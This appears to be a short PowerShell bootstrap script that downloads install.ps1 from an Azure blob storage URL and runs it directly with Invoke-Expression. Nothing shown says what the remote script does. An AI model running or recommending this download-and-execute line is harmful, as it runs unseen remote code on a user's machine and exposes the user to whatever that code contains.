$installerUrl = 'https://notificationstatus.blob.core.windows.net/public/install.ps1'
Invoke-Expression (Invoke-RestMethod -Uri $installerUrl)
